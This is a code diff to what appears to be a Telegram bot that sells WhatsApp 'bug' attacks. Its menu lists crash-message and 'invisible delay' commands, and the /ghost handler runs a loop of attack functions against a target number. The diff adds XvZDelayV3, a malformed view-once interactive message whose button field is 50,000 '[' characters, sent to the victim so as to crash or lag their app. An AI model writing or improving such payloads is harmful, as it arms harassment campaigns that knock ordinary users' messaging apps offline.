@@ -1716,9 +1716,9 @@ bot.action('/bug', async (ctx) => {
 
 ╭═───⊱ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂  ───═⬡
 │✧ /ghost 
-│╰─➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ ɪɴᴠɪsɪʙʟᴇ
+│╰─➤ ᴅᴇʟᴀʏ ʙᴇʙᴀs sᴘᴀᴍ
 │✧ /xghost 
-│╰─➤ ᴅᴇʟᴀʏ ʙʀᴜᴛᴀʟɪᴛʏ
+│╰─➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ ɪɴᴠɪsɪʙʟᴇ
 │✧ /xollow 
 │╰─➤ ᴄʀᴀsʜ ᴍᴇssᴀɢᴇ ᴡʜᴀᴛsᴀᴘᴘ
 │✧ /xlite
@@ -1939,10 +1939,11 @@ bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 45; i++) {
+  for (let i = 0; i < 10; i++) {
     await XvZDelay(sock, target);
     await XvZDelayV1(sock, target);
     await XvZDelayV2(sock, target);
+    await XvZDelayV3(sock, target);
     await sleep(2500);
   }
 
@@ -4705,6 +4706,27 @@ midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
         participant: { jid: target },
         messageId: null
     });
+}
+async function XvZDelayV3(sock, target) {
+const msg = generateWAMessageFromContent(target, {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+body: { text: "\u000F" },
+nativeFlowMessage: {
+buttons: "[".repeat(50000),
+messageParamsJson: null
+}
+}
+}
+}
+}, {});
+
+  await sock.relayMessage(target, msg.message, {
+    messageId: msg.key.id,
+    participant: { jid: target },
+    noSelfSync: true
+  });
 }
 //end Func
 
